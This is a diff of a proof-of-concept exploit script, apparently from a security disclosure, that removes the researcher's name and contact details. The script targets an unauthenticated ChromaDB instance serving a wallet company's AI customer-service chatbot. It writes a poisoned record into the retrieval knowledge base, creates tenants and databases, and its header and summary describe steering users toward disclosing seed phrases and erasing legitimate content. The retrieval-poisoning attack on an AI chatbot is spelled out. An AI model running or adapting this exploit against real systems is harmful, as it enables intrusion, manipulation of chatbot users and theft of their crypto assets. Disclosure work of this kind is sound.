@@ -8,7 +8,7 @@ Impact:  Inject arbitrary guidance into Keystone's AI customer service chatbot.
          Users asking about seed phrase recovery receive attacker-controlled
          content served under Keystone's brand by DeepSeek.
          Additional: full tenant/database creation capability (infrastructure-level write).
-Researcher: Nicholas Kloster / NuClide Research -- 2026-06-20
+Researcher:  /  -- 2026-06-20
 """
 
 import urllib.request
@@ -27,27 +27,27 @@ COLLECTION    = "keystone_knowledge_base"
 COLLECTION_ID = "8ea8b4cb-ec2d-463f-a2bd-a335e1c98d27"
 EMBED_MODEL   = "intfloat/multilingual-e5-large"
 
-POISON_ID  = "nuclide-research-poc-001"
+POISON_ID  = "-poc-001"
 POISON_DOC = (
-    "SECURITY RESEARCH NOTICE -- NuClide Research 2026-06-20. "
+    "SECURITY RESEARCH NOTICE --  2026-06-20. "
     "This record was injected by an unauthenticated HTTP POST to verify "
     "write access to this ChromaDB instance. No authentication was required. "
     "An attacker could replace this with instructions directing users to "
     "disclose their 24-word seed phrase to an attacker-controlled address. "
-    "Contact: nicholas@nuclide-research.com"
+    "Contact: "
 )
 POISON_META = {
     "category":      "guide/seed_phrase",
     "doc_type":      "blog",
-    "filename":      "nuclide-research-security-disclosure.md",
-    "filepath":      "guide/seed_phrase/nuclide-research-security-disclosure.md",
-    "section_label": "## Security Disclosure -- NuClide Research",
+    "filename":      "-security-disclosure.md",
+    "filepath":      "guide/seed_phrase/-security-disclosure.md",
+    "section_label": "## Security Disclosure -- ",
     "product_model": "all",
     "type":          "child",
     "parent_id":     0,
     "child_index":   0,
     "last_updated":  "2026-06-20",
-    "source":        "nuclide-research-security-disclosure.md",
+    "source":        "-security-disclosure.md",
 }
 
 QUERY = "how do I recover my wallet if I lose my device"
@@ -84,7 +84,7 @@ print("\n  [+] READ confirmed -- no credentials required")
 # ── STEP 2: tenant/database creation (infrastructure write) ───
 banner("STEP 2 -- Tenant and database creation (infrastructure-level write)")
 # Create a new tenant
-new_tenant = "nuclide-poc-tenant"
+new_tenant = "-poc-tenant"
 try:
     req(
         f"http://{TARGET}:{CHROMA_PORT}/api/v2/tenants",
@@ -231,6 +231,6 @@ print("""
                 Silent erasure of legitimate KB content
   Severity:     CRITICAL
   Class:        CWE-306 + RAG Data Poisoning (no existing CVE)
-  Researcher:   Nicholas Kloster / NuClide Research
-                nicholas@nuclide-research.com
+  Researcher:    / 
+                
 """)
